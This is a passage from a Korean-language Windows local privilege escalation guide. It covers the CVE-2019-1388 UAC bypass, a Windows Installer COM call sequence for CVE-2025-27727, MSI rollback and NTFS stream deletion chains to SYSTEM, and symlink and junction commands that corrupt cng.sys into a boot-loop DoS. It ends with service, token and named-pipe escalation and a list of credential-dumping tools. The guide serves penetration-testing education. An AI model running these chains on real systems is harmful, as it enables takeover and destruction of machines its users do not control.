이를 통해 동일한 취약점을 이용해 권한을 상승시키는 동시에 UAC를 우회할 수 있습니다. 또한 아무것도 설치할 필요가 없으며, 이 과정에서 사용되는 바이너리는 Microsoft가 서명하고 발급한 것입니다.

영향을 받는 시스템은 다음과 같습니다.

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

이 취약점을 exploit하려면 다음 단계를 수행해야 합니다:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

GitHub repository에서 필요한 모든 파일과 정보를 확인할 수 있습니다:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium에서 High Integrity Level로 / UAC Bypass

**Integrity Levels**에 대해 알아보려면 다음을 읽으세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그런 다음 **UAC와 UAC bypasses**에 대해 알아보려면 다음을 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root로 Upload Directory Junction 연결하기

애플리케이션은 예측 가능한 업로드 하위 디렉터리를 만들고, 호출자가 제공한 파일명을 사용해 파일을 해당 위치에 쓴 다음 처리할 수 있습니다. 권한이 낮은 사용자가 서버 측 쓰기 전에 해당 하위 디렉터리를 삭제하고 NTFS junction으로 바꿀 수 있다면, 쓰기 작업이 junction을 따라 웹에서 제공되는 디렉터리로 향할 수 있습니다. 서버가 해당 파일 형식을 실행한다면, 그곳에 배치된 스크립트는 웹 서비스의 identity로 실행될 수 있습니다. 이는 애플리케이션별 임의 쓰기 경계입니다. 쓰기 가능한 업로드 디렉터리나 기존 junction만으로는 취약성이 입증되지 않습니다.

업로드 handler의 정확한 경로 구성과 실행 시점, 사용자의 하위 디렉터리 삭제/생성 권한, 대상 경로의 유효 ACL, 쓰기 작업이 reparse point를 따르는지 여부, 그리고 웹 서버가 해당 대상 경로의 파일을 실행하는지 확인하세요. 쓰기 작업을 수행하는 프로세스와 웹 서버의 프로세스 identity를 각각 확인하세요. 수동 인벤토리로 디렉터리 ACL과 reparse metadata를 확인할 수 있지만, handler의 동작이나 향후 junction 교체 여부까지 입증할 수는 없습니다. 실행이 서비스 계정으로 이루어진다면 별도의 token-privilege 경로를 고려하기 전에 **실제 프로세스 token**을 확인하세요.

## 임의 폴더 삭제/이동/이름 변경에서 SYSTEM EoP로

[**이 블로그 게시물에서**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 설명한 기법이며, exploit 코드는 [**여기에서 확인할 수 있습니다**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

이 공격은 Windows Installer의 rollback 기능을 악용해 제거 과정에서 정상 파일을 악성 파일로 교체합니다. 이를 위해 공격자는 **악성 MSI installer**를 만들어 `C:\Config.Msi` 폴더를 hijack해야 합니다. Windows Installer는 이후 다른 MSI 패키지를 제거할 때 이 폴더에 rollback 파일을 저장하며, 해당 rollback 파일은 악성 payload를 포함하도록 변조됩니다.

### Windows Installer COM cleanup 경로 주입 (CVE-2025-27727)

권한이 낮은 클라이언트는 `CMsiConfigurationManager` COM 객체 (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`)를 통해 SYSTEM 권한의 `msiexec.exe` 서비스에 접근할 수 있습니다. Reverse engineering을 통해 관련 `IMsiServer` 호출이 vtable offset `0xA0`의 `MsiBeginTransactionW`, `0xC8`의 `SetEEUIDirectoryAndFilter`, `0x50`의 `CleanupTempPackages`로 확인되었습니다. 이 이름과 offset은 reverse-engineering을 통해 확인된 것으로, 빌드에 따라 달라질 수 있습니다.<sup>[[41]](#references)</sup>

관리자가 아닌 경우 `SetEEUIDirectoryAndFilter`는 제공된 경로를 `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, `FILE_FLAG_OPEN_REPARSE_POINT` 플래그로 여는 동안에만 호출자를 impersonate합니다. 이는 호출자가 디렉터리를 삭제할 수 있음을 입증하고 reparse point를 따라가지 않도록 하지만, 검사한 파일 객체가 이후 cleanup 과정에서도 동일하다는 점을 보장하거나 해당 파일을 Windows Installer가 생성했다는 점을 입증하지는 않습니다.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` 호출 후 `SetEEUIDirectoryAndFilter`는 호출자의 filter 인수와 관계없이 해당 경로를 폴더로 등록합니다. 서비스는 `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` 아래에 이름이 지정된 `REG_DWORD` 값을 씁니다. 값 이름은 호출자가 제어하는 경로이며, 데이터 `0x00000002`는 폴더 flag입니다. 그런 다음 `CleanupTempPackages(NULL, FALSE)`가 cleanup을 바로 시작합니다. 권한이 상승된 worker는 registry 값을 열거하고 경로 출처를 확인하지 않은 채 폴더 항목을 재귀적 `FDeleteFolder`에 전달합니다. 일반적인 제거에 실패하면 코드가 `LockdownPath`도 호출하고, 파일 속성을 지운 뒤 재시도합니다.<sup>[[41]](#references)</sup>

`msi.dll`에서 확인한 최소 호출 순서는 다음과 같습니다:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

유용한 primitive는 junction redirect가 아니라 path 재사용입니다. 공격자가 만든 `C:\Config.Msi`를 등록한 뒤 제거하고, Windows Installer가 나중에 같은 pathname을 보호된 rollback 데이터와 함께 다시 만들도록 합니다. Cleanup은 오래된 `TempPackages` 이름을 신뢰하고 새 디렉터리를 SYSTEM 권한으로 삭제합니다. reparse point가 필요하지 않으므로 `FILE_FLAG_OPEN_REPARSE_POINT`와 redirection-trust 완화책이 의도한 경계를 우회합니다.<sup>[[41]](#references)</sup>

이 삭제 primitive는 아래 rollback chain에 활용할 수 있습니다. 별도의 `Installer\Folders` record를 보존하고, 보호된 `C:\Config.Msi`를 삭제한 다음 NULL DACL로 다시 만들고, installer가 DACL을 강화하기 전에 `WRITE_DAC` 권한이 부여된 handle을 보유합니다. 미리 열어 둔 handle로 `NtSetSecurityObject`를 사용해 permissive DACL을 복원할 수 있으며, 이후 rollback이 재개되기 전에 생성된 `.rbs`를 교체할 수 있습니다.<sup>[[41]](#references)</sup>

Microsoft는 새 feature gate가 활성화된 경우 `CMsiTransaction::SetEEUIDirectoryAndFilter`가 `ScheduleFileOrFolderDelete`를 호출하지 못하게 하여 이 경로를 수정했습니다. COM call은 여전히 성공을 반환할 수 있지만, 더는 공격자가 제어하는 path를 `TempPackages`에 추가하지 않습니다. method가 성공적으로 반환하는지를 patch 테스트로 삼지 말고, 2025년 4월 Windows security update를 적용하세요.<sup>[[41]](#references)[[42]](#references)</sup>

요약된 technique은 다음과 같습니다.

1. **Stage 1 – Hijack 준비 (`C:\Config.Msi`를 비워 둠)**

- Step 1: MSI 설치
    - 쓰기 가능한 폴더(`TARGETDIR`)에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
    - **non-admin user**도 실행할 수 있도록 installer를 **"UAC Compliant"**로 설정합니다.
    - 설치 후 파일에 대한 **handle**을 계속 열어 둡니다.

- Step 2: Uninstall 시작
    - 같은 `.msi`를 uninstall합니다.
    - Uninstall process가 파일을 `C:\Config.Msi`로 옮기고 `.rbf` 파일(rollback backup)로 이름을 바꾸기 시작합니다.
    - 파일이 `C:\Config.Msi\<random>.rbf`가 되는 시점을 감지하려면 `GetFinalPathNameByHandle`로 열린 파일 handle을 **poll**합니다.

- Step 3: 사용자 지정 동기화
    - `.msi`에는 다음 작업을 수행하는 **custom uninstall action (`SyncOnRbfWritten`)**이 포함됩니다.
        - `.rbf`가 기록되면 신호를 보냅니다.
        - 그런 다음 uninstall을 계속하기 전에 다른 event를 **기다립니다**.

- Step 4: `.rbf` 삭제 차단
    - 신호를 받으면 `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 **엽니다**. 이로써 **파일 삭제를 방지합니다**.
    - 그런 다음 uninstall이 끝날 수 있도록 신호를 다시 보냅니다.
    - Windows Installer는 `.rbf` 삭제에 실패하며, 모든 내용을 삭제할 수 없으므로 **`C:\Config.Msi`가 제거되지 않습니다**.

- Step 5: `.rbf` 수동 삭제
    - 공격자가 `.rbf` 파일을 직접 삭제합니다.
    - 이제 **`C:\Config.Msi`가 비어 있어** hijack할 준비가 됩니다.

> 이 시점에서 **SYSTEM 수준의 임의 폴더 삭제 취약점**을 트리거하여 `C:\Config.Msi`를 삭제합니다.

2. **Stage 2 – Rollback script를 악성 script로 교체**

- Step 6: 취약한 ACL로 `C:\Config.Msi` 재생성
    - `C:\Config.Msi` 폴더를 직접 다시 만듭니다.
    - **취약한 DACL**(예: Everyone:F)을 설정하고 `WRITE_DAC` 권한이 있는 handle을 **계속 열어 둡니다**.

- Step 7: 다른 설치 실행
    - 다음 설정으로 `.msi`를 다시 설치합니다.
        - `TARGETDIR`: 쓰기 가능한 위치.
        - `ERROROUT`: 강제 실패를 유발하는 변수.
    - 이 설치는 `.rbs`와 `.rbf`를 읽는 **rollback**을 다시 트리거하는 데 사용됩니다.

- Step 8: `.rbs` 감시
    - 새 `.rbs`가 나타날 때까지 `ReadDirectoryChangesW`로 `C:\Config.Msi`를 감시합니다.
    - 파일 이름을 기록합니다.

- Step 9: Rollback 전에 동기화
    - `.msi`에는 다음 작업을 수행하는 **custom install action (`SyncBeforeRollback`)**이 포함됩니다.
        - `.rbs`가 생성되면 event 신호를 보냅니다.
        - 그런 다음 계속하기 전에 **기다립니다**.

- Step 10: 취약한 ACL 다시 적용
    - `.rbs created` event를 받은 후:
        - Windows Installer가 `C:\Config.Msi`에 **강력한 ACL을 다시 적용합니다**.
        - 하지만 `WRITE_DAC` 권한이 있는 handle을 계속 보유하고 있으므로 **취약한 ACL을 다시 적용할 수 있습니다**.

> ACL은 **handle을 열 때만 적용**되므로 폴더에 계속 쓸 수 있습니다.

- Step 11: 가짜 `.rbs`와 `.rbf` 배치
    - `.rbs` 파일을 가짜 rollback script로 덮어써서 Windows가 다음을 수행하도록 합니다.
        - `.rbf` 파일(악성 DLL)을 **권한이 높은 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)로 복원합니다.
    - **악성 SYSTEM 수준 payload DLL**이 들어 있는 가짜 `.rbf`를 배치합니다.

- Step 12: Rollback 트리거
    - 동기화 event에 신호를 보내 installer를 재개합니다.
    - **type 19 custom action (`ErrorOut`)**이 지정된 지점에서 설치를 **의도적으로 실패**하도록 설정되어 있습니다.
    - 이로 인해 **rollback이 시작됩니다**.

- Step 13: SYSTEM이 DLL 설치
    - Windows Installer는:
        - 악성 `.rbs`를 읽습니다.
        - `.rbf` DLL을 대상 위치에 복사합니다.
    - 이제 **SYSTEM이 로드하는 경로에 악성 DLL이 있습니다**.

- Final Step: SYSTEM 코드 실행
    - hijack한 DLL을 로드하는 신뢰할 수 있는 **auto-elevated binary**(예: `osk.exe`)를 실행합니다.
    - **성공**: 코드가 **SYSTEM 권한으로** 실행됩니다.


### 임의 파일 삭제/이동/이름 변경에서 SYSTEM EoP로

주요 MSI rollback technique(앞에서 설명한 방식)은 **폴더 전체**(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 하지만 취약점으로 **임의 파일 삭제**만 가능한 경우는 어떨까요?

**NTFS internals**를 악용할 수 있습니다. 모든 폴더에는 다음과 같은 숨겨진 alternate data stream이 있습니다:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

이 stream에는 폴더의 **인덱스 메타데이터**가 저장됩니다.

따라서 폴더의 `::$INDEX_ALLOCATION` stream을 **삭제하면** NTFS는 파일 시스템에서 **폴더 전체를 제거합니다**.

다음과 같은 표준 파일 삭제 API를 사용하면 됩니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* 삭제 API를 호출하는데도 **폴더 자체가 삭제됩니다**.

### 폴더 내용 삭제에서 SYSTEM EoP로
사용 중인 primitive로 임의의 파일/폴더를 삭제할 수는 없지만, 공격자가 제어하는 폴더의 *내용*은 삭제할 수 있다면 어떻게 해야 할까요?

1. 1단계: 미끼 폴더와 파일 설정
- 생성: `C:\temp\folder1`
- 폴더 안에 생성: `C:\temp\folder1\file1.txt`

2. 2단계: `file1.txt`에 **oplock** 설정
- privileged process가 `file1.txt`를 삭제하려고 하면 oplock이 **실행을 일시 중지**합니다.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM 프로세스 트리거(예: `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 검사하고 해당 폴더의 내용을 삭제하려고 합니다.
- `file1.txt`에 도달하면 **oplock이 트리거**되고 제어가 callback으로 넘어갑니다.

4. Step 4: oplock callback 내부 – 삭제 리디렉션

- Option A: `file1.txt`를 다른 곳으로 이동
    - oplock을 깨지 않고 `folder1`을 비웁니다.
    - `file1.txt`를 직접 삭제하지 마세요. 그러면 oplock이 너무 일찍 해제됩니다.

- Option B: `folder1`을 **junction**으로 변환:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- 옵션 C: `\RPC Control`에 **symlink**를 생성합니다:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> 이는 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 대상으로 합니다. 이 스트림을 삭제하면 폴더가 삭제됩니다.

5. Step 5: oplock 해제
- SYSTEM 프로세스가 계속 진행되어 `file1.txt`를 삭제하려고 합니다.
- 하지만 이제 junction + symlink 때문에 실제로 삭제되는 것은 다음과 같습니다:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### 임의의 폴더 생성에서 영구적인 DoS까지

**SYSTEM/admin 권한으로 임의의 폴더를 생성할 수 있는** primitive를 exploit합니다. **파일을 쓸 수 없거나** **취약한 권한을 설정할 수 없는 경우에도** 가능합니다.

**중요한 Windows 드라이버**의 이름으로 **폴더**(파일이 아님)를 만듭니다. 예:
```
C:\Windows\System32\cng.sys
```

- 이 경로는 보통 `cng.sys` 커널 모드 드라이버에 해당합니다.
- **미리 폴더로 만들어 두면**, Windows가 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면 Windows는 부팅 중 `cng.sys`를 로드하려고 합니다.
- 폴더를 발견한 Windows는 **실제 드라이버를 찾지 못하고**, **충돌하거나 부팅을 중단합니다**.
- **대체 경로도 없고**, 외부에서 개입하지 않으면(예: 부팅 복구 또는 디스크 접근) **복구할 수 없습니다**.

### 권한 있는 로그/백업 경로 + OM 심볼릭 링크를 이용해 임의 파일 덮어쓰기 / 부팅 DoS 유발

**권한 있는 서비스**가 **쓰기 가능한 설정 파일**에서 읽은 경로에 로그/내보내기 파일을 쓸 때, **Object Manager 심볼릭 링크 + NTFS 마운트 포인트**로 해당 경로를 리디렉션해 권한 있는 쓰기를 임의 파일 덮어쓰기로 바꿀 수 있습니다(SeCreateSymbolicLinkPrivilege 없이도 가능).<sup>[[15]](#references)</sup>

**요구 사항**
- 대상 경로가 저장된 설정 파일을 공격자가 수정할 수 있어야 합니다(예: `%ProgramData%\...\.ini`).
- `\RPC Control`에 마운트 포인트를 만들고 OM 파일 심볼릭 링크를 만들 수 있어야 합니다(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- 해당 경로에 쓰기를 수행하는 권한 있는 작업이 있어야 합니다(로그, 내보내기, 보고서).

**공격 체인 예시**
1. 설정 파일을 읽어 권한 있는 로그 경로를 확인합니다. 예: `C:\ProgramData\ICONICS\IcoSetup64.ini`에 있는 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. 관리자 권한 없이 경로를 리디렉션합니다:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한이 높은 구성 요소가 로그를 기록할 때까지 기다립니다(예: 관리자가 "테스트 SMS 보내기"를 실행). 이제 쓰기 작업은 `C:\Windows\System32\cng.sys`에 수행됩니다.
4. 덮어쓴 대상(hex/PE parser)을 검사해 손상 여부를 확인합니다. 재부팅하면 Windows가 변조된 드라이버 경로를 로드하게 되어 → **boot loop DoS**가 발생합니다. 이 방법은 권한이 높은 서비스가 쓰기 모드로 여는 보호된 파일이라면 무엇이든 대상으로 일반화할 수 있습니다.

> `cng.sys`는 일반적으로 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 복사본이 있으면 해당 파일을 먼저 로드하려고 시도할 수 있으므로 손상된 데이터를 쓰는 신뢰할 만한 DoS 대상이 될 수 있습니다.



## **High Integrity에서 System으로**

### **새 서비스**

이미 High Integrity 프로세스에서 실행 중이라면, 새 서비스를 **생성하고 실행하는 것만으로** **SYSTEM 권한을 얻는 경로**는 간단할 수 있습니다:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binary를 만들 때는 유효한 service인지 확인하거나, 필요한 작업을 빠르게 수행하도록 하세요. 유효한 service가 아니면 20s 후 종료됩니다.

### AlwaysInstallElevated

High Integrity process에서 **AlwaysInstallElevated registry entries를 활성화**하고 _**.msi**_ wrapper를 사용해 reverse shell을 **설치**할 수 있습니다.\
[관련 registry key와 _.msi_ package 설치 방법에 대한 자세한 정보](#alwaysinstallelevated)

### High + SeImpersonate 권한으로 System 획득

**코드는** [**여기에서 확인할 수 있습니다**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate에서 Full Token 권한 획득

이러한 token 권한이 있으면(이미 High Integrity process에서 찾을 수 있습니다), SeDebug 권한으로 (protected process가 아닌) **거의 모든 process를 열고**, 해당 process의 **token을 복사한 다음**, 그 token으로 **임의의 process를 생성**할 수 있습니다.\
이 기법은 보통 **모든 token 권한을 가진 SYSTEM process를 선택**합니다(_모든 token 권한을 갖지 않은 SYSTEM process도 찾을 수 있습니다_).\
**제안된 기법을 실행하는 코드** [**예제를 여기에서 확인할 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기법은 meterpreter가 `getsystem`에서 권한 상승에 사용합니다. **pipe를 생성한 다음, 해당 pipe에 쓰도록 service를 생성하거나 악용하는 방식**입니다. 이어서 **`SeImpersonate`** 권한으로 pipe를 생성한 **server**는 pipe client(service)의 **token을 impersonate**하여 SYSTEM 권한을 얻을 수 있습니다.\
[name pipes에 대해 더 알아보려면 이 내용을 읽어보세요](#named-pipe-client-impersonation).\
[name pipes를 사용해 high integrity에서 System으로 전환하는 예제는 여기에서 확인할 수 있습니다](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM으로 실행 중인 process가 로드하는 dll을 hijack**할 수 있다면, 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 종류의 privilege escalation에도 유용합니다. 또한 dll 로드에 사용되는 폴더에 **쓰기 권한**이 있으므로 **high integrity process에서 훨씬 더 쉽게 수행**할 수 있습니다.\
**Dll hijacking에 대한 자세한 내용은** [**여기에서 확인할 수 있습니다**](dll-hijacking/index.html)**.**

### **Administrator 또는 Network Service에서 System으로**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE 또는 NETWORK SERVICE에서 전체 권한 획득

**읽어보기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 추가 도움말

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 유용한 도구

**Windows 로컬 privilege escalation 경로를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 설정 및 민감한 파일을 확인합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 탐지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 가능한 잘못된 설정을 확인하고 정보를 수집합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 잘못된 설정 확인**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP의 저장된 session 정보를 추출합니다. 로컬에서 -Thorough를 사용하세요.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 credentials를 추출합니다. 탐지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 비밀번호를 domain 전체에 Spray합니다.**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell 기반 ADIDNS/LLMNR/mDNS 스푸핑 및 man-in-the-middle 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 Windows privesc 열거 도구**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 privesc 취약점을 검색합니다 (Watson으로 인해 DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(Admin 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점을 검색합니다 (VisualStudio를 사용해 컴파일해야 함) ([**미리 컴파일된 버전**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 잘못된 설정을 찾기 위해 host를 열거합니다 (privesc 도구보다는 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**미리 컴파일된 버전**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 다양한 software에서 credentials를 추출합니다 (github에 미리 컴파일된 exe가 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 잘못된 설정을 확인합니다 (github에 미리 컴파일된 executable이 있음). 권장하지 않습니다. Win10에서 제대로 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 잘못된 설정을 확인합니다 (python으로 만든 exe). 권장하지 않습니다. Win10에서 제대로 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 만든 도구입니다 (정상적으로 작동하는 데 accesschk가 필요하지 않지만 사용할 수는 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력을 읽고 작동하는 exploit을 추천합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력을 읽고 작동하는 exploit을 추천합니다 (로컬 Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

올바른 .NET 버전을 사용해 project를 컴파일해야 합니다 ([여기 참조](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). victim host에 설치된 .NET 버전을 확인하려면 다음을 실행하세요:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows 권한 상승 기초](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [취약한 폴더 권한을 악용한 권한 상승](http://www.greyhathacker.net/?p=738)
- [3] [Windows 권한 상승 치트시트](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux 로컬 권한 상승 워크숍](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 공격: AT가 새로운 블랙이다 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [권한 상승 - Windows - OSCP 종합 가이드](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 권한 상승 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 권한 상승 가이드](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 권한 상승 체크리스트](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 권한 상승](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester를 위한 Windows 권한 상승 방법](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP를 통한 Word VBA 매크로 피싱 → hMailServer 자격 증명 복호화 → Veeam CVE-2023-27532를 이용한 SYSTEM 권한 획득](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + 스택 BOF → VirtualAlloc ROP (RCE) 및 커널 토큰 탈취](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox 추적: 커널의 그림자 속 숨바꼭질](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA 시스템에 존재하는 권한 파일 시스템 취약점](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [심볼릭 링크 테스트 도구 – CreateSymlink 사용법](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [과거로 이어지는 링크: Windows에서 심볼릭 링크 악용하기](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF 포팅)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js의 신뢰 추락: Windows에서 위험한 모듈 확인 방식](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js 모듈: `node_modules` 폴더에서 로드하기](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ 체크리스트 과제 풀이](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 함수](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - 서비스 바이너리 하이재킹](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop과 함께한 Pwn2Own: CLDFLT와 DirectX 커널 경쟁 조건을 연쇄적으로 이용한 Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
